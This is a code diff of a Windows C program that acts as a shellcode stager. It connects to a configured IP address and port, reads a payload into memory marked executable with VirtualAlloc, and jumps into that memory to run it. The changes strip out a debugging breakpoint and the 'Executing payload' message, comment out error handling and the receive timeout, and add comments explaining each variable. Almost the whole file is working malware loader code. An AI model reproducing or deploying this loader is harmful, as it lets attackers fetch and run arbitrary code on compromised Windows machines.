@@ -8,29 +8,28 @@
 #define PAYLOAD_SZ 819200
 
 int main() {
-  // Create WSADATA Object
+  // Initialize Winsock and use version 2.2
   WSADATA wsaData;
   int wResult;
-
-  wResult = WSAStartup(MAKEWORD(2,2), &wsaData);
-  if (wResult != 0) {
-    return 1;
-  };
+  WSAStartup(MAKEWORD(2,2), &wsaData);
+  // if (wResult != 0) {
+  //    return 1;
+  //};
 
   // Create a socket to connect to an IP and port
-  printf("Creating socket...\n");
-  SOCKET ConnectSocket = INVALID_SOCKET;
-  ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+  // printf("Creating socket...\n");
+  SOCKET ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
+  // Define socket type, AF_INET (IPv4), IP address, and port.
   struct sockaddr_in saServer;
   saServer.sin_family = AF_INET;
   saServer.sin_addr.s_addr = inet_addr(IP_ADDRESS);
   saServer.sin_port = htons(PORT);
 
   // Set Receive timeout on the socket
-  struct timeval tv;
-  tv.tv_sec = 1;
-  setsockopt(ConnectSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&tv, sizeof(tv));
+  // struct timeval tv;
+  // tv.tv_sec = 1;
+  // setsockopt(ConnectSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&tv, sizeof(tv));
 
   // Connect to socket
   printf("Connecting to %s on port %d.\n", IP_ADDRESS, PORT);
@@ -39,10 +38,10 @@ int main() {
   // Receive data from port;
   char buf[BUF_LEN] = "";
   char *rwx = (char *)VirtualAlloc(NULL, PAYLOAD_SZ, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-  char *index = rwx;
-  int res = 0;
-  u_long size = 0;
-  int rcvd = 0;
+  char *index = rwx;    // Pointer to track position in the payload buffer.
+  int res = 0;          // Hold return value of recv().
+  u_long size = 0;      // Holds the size of the payload.
+  int rcvd = 0;         // Track how many bytes we have received. Should match size when done.
 
   printf("Receiving\n");
   do {
@@ -52,9 +51,7 @@ int main() {
     rcvd += res;
   } while (size > rcvd);
 
-  //send(ConnectSocket, "OK", 3, 0);
-  asm("int $3");
-  printf("Executing payload.\n");
+  // printf("Executing payload.\n");
   // Execute the received payload
   (*(void(*)()) (rwx + 4))();
 }
